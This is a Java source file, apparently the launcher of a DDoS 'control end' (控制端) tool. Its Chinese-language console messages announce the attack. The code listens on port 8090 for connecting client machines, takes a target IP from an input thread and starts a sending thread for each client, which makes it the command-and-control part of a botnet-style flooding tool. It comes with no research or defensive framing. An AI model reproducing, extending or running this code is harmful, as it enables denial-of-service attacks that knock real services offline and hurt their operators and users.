package com.zhanyingwl.www;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

/**
 * @ClassName : Runner
 * @Description : 启动类
 * @Author : 战鹰
 * @Version: 2.0
 */

public class Runner extends Thread {
    static Socket socket;
    static String targetHost = "none"; // 目标主机
    static String ClientIP = "none";
    static ServerSocket serverSocket; // 尝试共享一个serverSocket

    public static void main(String[] args) { // 监听端口
        try {
            serverSocket = new ServerSocket(8090);
            System.out.println("[+] 战鹰网络 - DDoS 控制端：端口监听成功！");
            InputTargetThread i = new InputTargetThread();
            System.out.println("[+] 战鹰网络 - DDoS 控制端：目标IP输入模块启动中...");
            i.start();
            System.out.println("[+] 战鹰网络 - DDoS 控制端：目标IP输入模块启动成功！");
            System.out.println("[+] 战鹰网络 - DDoS 控制端：等待客户端连接中...");
            while (true) {
                socket = serverSocket.accept();
                ClientIP = socket.getInetAddress().getHostAddress();
                System.out.println("[+] 战鹰网络 - DDoS 控制端：监测到客户端连接！客户端IP - " + ClientIP);
                System.out.println("[!] 战鹰网络 - DDoS 控制端：当前攻击目标IP - " + targetHost);
                System.out.println("--------------------------------------");
                doSend doSend = new doSend();
                doSend.start();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}